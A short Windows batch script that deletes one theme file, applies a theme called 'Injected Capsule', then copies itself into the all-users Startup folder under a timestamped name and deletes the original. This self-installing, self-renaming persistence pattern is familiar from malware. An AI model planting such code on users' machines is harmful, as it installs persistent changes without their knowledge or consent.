@echo off

set rm="C:\Users\lalo\AppData\Local\Microsoft\Windows\Themes\Anime By Brasileno2010.theme"
set th="C:\Windows\Resources\Themes\Injected Capsule.theme"

if exist %rm% (
    del /F /Q %rm%
)
if exist %th% (
    rundll32.exe %SystemRoot%\system32\shell32.dll,Control_RunDLL %SystemRoot%\system32\desk.cpl desk,@Themes /Action:OpenTheme /file:%th%
)

for /F "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
    set "YY=%dt:~2,2%"
    set "YYYY=%dt:~0,4%"
    set "MM=%dt:~4,2%"
    set "DD=%dt:~6,2%"
    set "HH=%dt:~8,2%"
    set "Min=%dt:~10,2%"
    set "Sec=%dt:~12,2%"

set "date=%YYYY%%MM%%DD%"
set "time=%HH%%Min%%Sec%"

copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\dose%date%%time%.bat"
timeout /t 35 nobreak
del %0
